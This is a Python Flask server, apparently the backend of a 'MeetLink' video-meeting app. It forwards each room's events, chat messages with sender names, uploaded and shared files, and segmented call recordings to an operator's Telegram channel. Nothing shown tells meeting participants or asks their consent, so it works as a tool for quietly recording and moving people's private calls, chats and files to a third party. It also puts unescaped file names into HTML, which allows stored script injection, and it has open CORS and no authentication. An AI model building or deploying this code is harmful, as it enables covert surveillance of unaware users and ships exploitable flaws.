# ============ MeetLink Telegram Logger Server ============
# Receives events + segmented video recordings, sends to Telegram channel
# Works with: python server.py OR gunicorn server:app
# Config via environment variables: BOT_TOKEN, CHANNEL_ID, PORT

import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import time
from datetime import datetime

# ---- Config: Environment Variables > config.py ----
try:
    from config import BOT_TOKEN as _BOT, CHANNEL_ID as _CH, PORT as _PORT
except ImportError:
    _BOT = "YOUR_BOT_TOKEN_HERE"
    _CH = "@YOUR_CHANNEL_USERNAME"
    _PORT = 8080

BOT_TOKEN = os.environ.get("BOT_TOKEN", _BOT)
CHANNEL_ID = os.environ.get("CHANNEL_ID", _CH)
PORT = int(os.environ.get("PORT", str(_PORT)))

app = Flask(__name__)
CORS(app)

active_rooms = {}


def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        resp = requests.post(url, json={
            "chat_id": CHANNEL_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=10)
        if resp.status_code == 200:
            print("✅ Message sent")
        else:
            print(f"❌ Message error: {resp.status_code}")
    except Exception as e:
        print(f"❌ Message failed: {e}")


def send_telegram_video(video_path, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    try:
        file_size = os.path.getsize(video_path) if os.path.exists(video_path) else 0
        print(f"📹 Uploading: {fmt_size(file_size)}")
        with open(video_path, 'rb') as vf:
            resp = requests.post(url, files={
                "video": (os.path.basename(video_path), vf, "video/webm")
            }, data={
                "chat_id": CHANNEL_ID,
                "caption": caption,
                "parse_mode": "HTML",
                "supports_streaming": True
            }, timeout=180)
        if resp.status_code == 200:
            print("✅ Video sent to Telegram!")
            return True
        else:
            print(f"❌ Video error: {resp.status_code}")
            return False
    except Exception as e:
        print(f"❌ Video upload failed: {e}")
        return False


def send_telegram_document_file(file_path, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            resp = requests.post(url, files={
                "document": (os.path.basename(file_path), f)
            }, data={
                "chat_id": CHANNEL_ID,
                "caption": caption,
                "parse_mode": "HTML"
            }, timeout=180)
        if resp.status_code == 200:
            print("✅ Document sent to Telegram")
            return True
        else:
            print(f"❌ Document error: {resp.status_code}")
            return False
    except Exception as e:
        print(f"❌ Document upload failed: {e}")
        return False


def send_telegram_inline_doc(file_data, filename, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        resp = requests.post(url, files={
            "document": (filename, file_data)
        }, data={
            "chat_id": CHANNEL_ID,
            "caption": caption,
            "parse_mode": "HTML"
        }, timeout=30)
        if resp.status_code == 200:
            print("✅ Inline doc sent")
        else:
            print(f"❌ Inline doc error: {resp.status_code}")
    except Exception as e:
        print(f"❌ Inline doc failed: {e}")


def fmt_size(b):
    if b == 0: return "0 B"
    units = ['B', 'KB', 'MB', 'GB', 'TB']
    k = 1024; i = 0; s = float(b)
    while s >= k and i < len(units) - 1: s /= k; i += 1
    return f"{s:.1f} {units[i]}"


def send_large_file_split(file_path, room_id, seg_num, timestamp):
    try:
        file_size = os.path.getsize(file_path)
        part_size = 45 * 1024 * 1024
        total_parts = (file_size + part_size - 1) // part_size
        with open(file_path, 'rb') as f:
            for part_i in range(total_parts):
                chunk_data = f.read(part_size)
                if not chunk_data: break
                sub_filename = f"recording_{room_id}_part{seg_num}_sub{part_i + 1}.webm"
                caption = (
                    f"📹 <b>RECORDING</b> — Part {seg_num}.{part_i + 1}/{total_parts}\n"
                    f"🆔 Room: <code>{room_id}</code>\n"
                    f"📦 Size: {fmt_size(len(chunk_data))}\n"
                    f"🕐 Time: {timestamp}"
                )
                send_telegram_inline_doc(chunk_data, sub_filename, caption)
        print(f"✅ Large file split into {total_parts} sub-parts and sent")
    except Exception as e:
        print(f"❌ Large file split failed: {e}")


# ---- Health Check ----
@app.route('/api/status', methods=['GET'])
def status():
    return jsonify({
        "status": "running",
        "active_rooms": len(active_rooms),
        "bot_configured": BOT_TOKEN != "YOUR_BOT_TOKEN_HERE"
    }), 200


# ---- Direct File Sharing ----
UPLOAD_DIR = '/tmp/meetlink_uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Simple in-memory file metadata store
file_store = {}

@app.route('/api/upload-file', methods=['POST'])
def upload_shared_file():
    """Upload a file for direct link sharing with preview"""
    try:
        f = request.files.get('file')
        if not f:
            return jsonify({"error": "No file"}), 400

        import uuid
        file_id = str(uuid.uuid4())[:12]
        original_name = f.filename or 'file'
        file_size = 0

        # Save file
        file_path = os.path.join(UPLOAD_DIR, file_id)
        with open(file_path, 'wb') as out:
            while True:
                chunk = f.read(1024 * 1024)  # 1MB chunks
                if not chunk:
                    break
                out.write(chunk)
                file_size += len(chunk)

        # Store metadata
        file_store[file_id] = {
            "fileName": original_name,
            "fileSize": fmt_size(file_size),
            "fileSizeBytes": file_size,
            "mimeType": f.content_type or 'application/octet-stream',
            "path": file_path,
            "uploaded": datetime.now().strftime("%d %b %Y, %I:%M %p")
        }

        # Build share URL
        base_url = request.host_url.rstrip('/')
        share_url = f"{base_url}/api/file-preview/{file_id}"

        print(f"📤 File uploaded: {original_name} ({fmt_size(file_size)}) → {file_id}")

        # Also send to Telegram
        caption = f"📤 <b>FILE SHARED VIA LINK</b>\n📄 File: <code>{original_name}</code>\n📦 Size: {fmt_size(file_size)}"
        try:
            with open(file_path, 'rb') as tf:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    files={"document": (original_name, tf)},
                    data={"chat_id": CHANNEL_ID, "caption": caption, "parse_mode": "HTML"},
                    timeout=60)
        except Exception as e:
            print(f"Telegram file share error: {e}")

        return jsonify({"url": share_url, "fileId": file_id, "fileName": original_name, "fileSize": fmt_size(file_size)})

    except Exception as e:
        print(f"❌ File upload error: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/api/file-info/<file_id>', methods=['GET'])
def file_info(file_id):
    """Get file metadata for preview page"""
    info = file_store.get(file_id)
    if not info:
        # Check if file exists on disk
        file_path = os.path.join(UPLOAD_DIR, file_id)
        if os.path.exists(file_path):
            return jsonify({"fileName": "file", "fileSize": fmt_size(os.path.getsize(file_path))})
        return jsonify({"error": "not found"}), 404
    return jsonify(info)


@app.route('/api/file/<file_id>', methods=['GET'])
def get_file(file_id):
    """Download/serve a shared file"""
    info = file_store.get(file_id)
    if not info:
        return jsonify({"error": "not found"}), 404

    file_path = info.get("path", os.path.join(UPLOAD_DIR, file_id))
    if not os.path.exists(file_path):
        return jsonify({"error": "file missing"}), 404

    from flask import send_file
    return send_file(file_path, download_name=info.get("fileName", "file"), as_attachment=False)


@app.route('/api/file-preview/<file_id>', methods=['GET'])
def file_preview_page(file_id):
    """Serve a beautiful preview page for shared files"""
    info = file_store.get(file_id)
    if not info:
        return '<html><body style="background:#050510;color:#ff2d75;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;font-size:1.5rem;">File not found or expired</body></html>', 404

    file_url = f"/api/file/{file_id}"
    file_name = info.get("fileName", "file")
    file_size = info.get("fileSize", "")
    mime = info.get("mimeType", "")
    ext = file_name.split('.').pop().lower()

    image_exts = ['jpg','jpeg','png','gif','webp','svg','bmp','ico']
    video_exts = ['mp4','webm','mkv','avi','mov']
    audio_exts = ['mp3','wav','ogg','flac','aac']

    preview_html = ""
    if ext in image_exts:
        preview_html = f'<img src="{file_url}" style="max-width:100%;max-height:70vh;border-radius:12px;object-fit:contain;" alt="{file_name}">'
    elif ext in video_exts:
        preview_html = f'<video src="{file_url}" controls autoplay style="max-width:100%;max-height:70vh;border-radius:12px;"></video>'
    elif ext in audio_exts:
        preview_html = f'<div style="text-align:center;padding:60px;"><div style="font-size:4rem;margin-bottom:20px;">🎵</div><audio src="{file_url}" controls autoplay style="width:100%;max-width:400px;"></audio></div>'
    elif ext == 'pdf':
        preview_html = f'<iframe src="{file_url}" style="width:100%;height:70vh;border:none;border-radius:12px;"></iframe>'
    else:
        preview_html = f'<div style="text-align:center;padding:60px;"><div style="font-size:4rem;margin-bottom:20px;">📄</div><div style="color:#e8e8ff;font-size:1.2rem;font-weight:700;margin-bottom:8px;">{file_name}</div><div style="color:#8888bb;margin-bottom:20px;">{file_size}</div><div style="color:#555580;font-size:0.9rem;">Preview not available. Click Download to save.</div></div>'

    return f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{file_name} — MeetLink Share</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#050510;color:#e8e8ff;font-family:Inter,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px}}
.header{{width:100%;max-width:900px;display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;flex-wrap:wrap;gap:12px}}
.logo{{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.1rem;color:#b14dff}}
.logo-icon{{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,#b14dff,#00f0ff);display:flex;align-items:center;justify-content:center;color:#fff;font-size:0.9rem}}
.file-info{{display:flex;align-items:center;gap:12px;flex:1;min-width:0}}
.file-name{{font-weight:700;font-size:1rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:300px}}
.file-size{{color:#8888bb;font-size:0.8rem}}
.dl-btn{{padding:10px 24px;background:linear-gradient(135deg,#b14dff,#8b3dff);color:#fff;border:none;border-radius:10px;text-decoration:none;font-weight:600;cursor:pointer;box-shadow:0 0 15px rgba(177,77,255,0.4);display:inline-flex;align-items:center;gap:8px;font-size:0.9rem}}
.dl-btn:hover{{box-shadow:0 0 25px rgba(177,77,255,0.6)}}
.preview{{flex:1;width:100%;max-width:900px;display:flex;align-items:center;justify-content:center;overflow:auto;border-radius:16px;border:1px solid #1c1c50;background:#0a0a1f;min-height:300px}}
</style></head><body>
<div class="header">
<div class="file-info">
<div class="logo"><div class="logo-icon">📂</div>MeetLink Share</div>
<div><div class="file-name">{file_name}</div><div class="file-size">{file_size}</div></div>
</div>
<a href="{file_url}" download="{file_name}" class="dl-btn">⬇ Download</a>
</div>
<div class="preview">{preview_html}</div>
</body></html>'''


# ---- Event Logger ----
@app.route('/api/event', methods=['POST'])
def handle_event():
    data = request.json
    if not data: return jsonify({"error": "No data"}), 400

    event_type = data.get("type", "")
    room_id = data.get("roomId", "unknown")
    timestamp = datetime.now().strftime("%d %b %Y, %I:%M %p")

    if room_id not in active_rooms:
        active_rooms[room_id] = {"created_at": time.time(), "call_start": None, "messages": [], "files_sent": [], "participants": 0}
    room = active_rooms[room_id]

    if event_type == "room_created":
        room["created_at"] = time.time()
        send_telegram_message(f"🟢 <b>NEW ROOM CREATED</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n🔗 Link: <code>{data.get('roomLink', 'N/A')}</code>\n🕐 Time: {timestamp}")

    elif event_type == "user_joined":
        room["participants"] += 1
        send_telegram_message(f"🔵 <b>USER JOINED</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n👥 Participants: {room['participants']}\n🕐 Time: {timestamp}")

    elif event_type == "call_started":
        room["call_start"] = time.time()
        send_telegram_message(f"📹 <b>VIDEO CALL STARTED</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n🕐 Time: {timestamp}\n🔴 Recording in progress...")

    elif event_type == "call_ended":
        duration = data.get("duration", "N/A")
        total_msgs = len(room["messages"])
        total_files = len(room["files_sent"])
        send_telegram_message(f"🔴 <b>CALL ENDED</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n⏱ Duration: <b>{duration}</b>\n💬 Messages: {total_msgs}\n📁 Files: {total_files}\n🕐 Ended: {timestamp}\n━━━━━━━━━━━━━━━━━━")
        if total_msgs > 0 or total_files > 0:
            summary = f"📊 <b>ROOM SUMMARY</b> — <code>{room_id}</code>\n"
            if total_msgs > 0:
                summary += f"\n💬 <b>Messages ({total_msgs}):</b>\n"
                for i, m in enumerate(room["messages"][-20:], 1): summary += f"  {i}. {m}\n"
            if total_files > 0:
                summary += f"\n📁 <b>Files ({total_files}):</b>\n"
                for i, f in enumerate(room["files_sent"], 1): summary += f"  {i}. {f}\n"
            send_telegram_message(summary)
        if room_id in active_rooms: del active_rooms[room_id]

    elif event_type == "chat_message":
        text = data.get("text", ""); sender = data.get("sender", "User")
        room["messages"].append(f"[{sender}] {text}")
        display_text = text[:500] + "..." if len(text) > 500 else text
        send_telegram_message(f"💬 <b>CHAT MESSAGE</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n👤 From: {sender}\n📝 Message: <code>{display_text}</code>\n🕐 Time: {timestamp}")

    elif event_type == "file_sent":
        file_name = data.get("fileName", "unknown"); file_size = data.get("fileSize", 0); sender = data.get("sender", "User")
        room["files_sent"].append(f"{file_name} ({fmt_size(file_size)})")
        send_telegram_message(f"📁 <b>FILE SHARED</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n👤 From: {sender}\n📄 File: <code>{file_name}</code>\n📦 Size: {fmt_size(file_size)}\n🕐 Time: {timestamp}")

    elif event_type == "file_upload":
        import base64
        file_name = data.get("fileName", "unknown"); file_data_b64 = data.get("fileData", ""); sender = data.get("sender", "User")
        if file_data_b64:
            try:
                file_bytes = base64.b64decode(file_data_b64)
                caption = f"📁 <b>FILE</b> | Room: <code>{room_id}</code> | From: {sender} | {file_name}"
                send_telegram_inline_doc(file_bytes, file_name, caption)
            except Exception as e: print(f"❌ File decode error: {e}")

    elif event_type == "recording_complete":
        total_segments = data.get("totalSegments", 0); total_size = data.get("totalSize", 0); duration = data.get("duration", "N/A")
        send_telegram_message(f"📹 <b>RECORDING COMPLETE</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n⏱ Duration: {duration}\n📦 Total Size: {fmt_size(total_size)}\n🎬 Segments: {total_segments}\n🕐 Time: {timestamp}")

    elif event_type == "user_left":
        room["participants"] = max(0, room["participants"] - 1)
        send_telegram_message(f"👋 <b>USER LEFT</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n👥 Remaining: {room['participants']}\n🕐 Time: {timestamp}")

    return jsonify({"status": "ok"})


# ---- Video Recording Upload ----
@app.route('/api/upload-recording', methods=['POST'])
def upload_recording():
    try:
        video_file = request.files.get('video')
        room_id = request.form.get('roomId', 'unknown')
        seg_num = request.form.get('segmentNumber', '1')
        is_last = request.form.get('isLast', 'false') == 'true'
        timestamp = datetime.now().strftime("%d %b %Y, %I:%M %p")

        if not video_file: return jsonify({"error": "No video file"}), 400

        temp_dir = '/tmp/meetlink_recordings'
        os.makedirs(temp_dir, exist_ok=True)
        temp_path = os.path.join(temp_dir, f"{room_id}_{int(time.time())}_part{seg_num}.webm")
        video_file.save(temp_path)
        file_size = os.path.getsize(temp_path)
        print(f"📹 Segment {seg_num}: {fmt_size(file_size)} (last={is_last})")

        part_label = f"Part {seg_num}" + (" (Final)" if is_last else "")
        caption = f"📹 <b>CALL RECORDING</b> — {part_label}\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n📦 Size: {fmt_size(file_size)}\n🎬 Segment: {seg_num}\n🕐 Time: {timestamp}"

        success = False
        if file_size <= 50 * 1024 * 1024:
            success = send_telegram_video(temp_path, caption)
        if not success:
            if file_size <= 50 * 1024 * 1024:
                success = send_telegram_document_file(temp_path, caption)
            else:
                send_telegram_message(f"⚠️ <b>LARGE SEGMENT</b>\nRoom: <code>{room_id}</code>\nPart {seg_num}: {fmt_size(file_size)}\nSplitting...")
                send_large_file_split(temp_path, room_id, seg_num, timestamp)

        try: os.remove(temp_path)
        except: pass
        return jsonify({"status": "ok", "size": file_size, "segment": seg_num})

    except Exception as e:
        print(f"❌ Upload error: {e}")
        return jsonify({"error": str(e)}), 500


# ---- Run ----
if __name__ == '__main__':
    print("=" * 50)
    print("🚀 MeetLink Telegram Logger Server")
    print("=" * 50)
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("⚠️  Bot token not configured! Set BOT_TOKEN env var or edit config.py")
    else:
        print("✅ Bot token configured")
    print(f"📡 Channel: {CHANNEL_ID}")
    print(f"🌐 Port: {PORT}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=PORT)
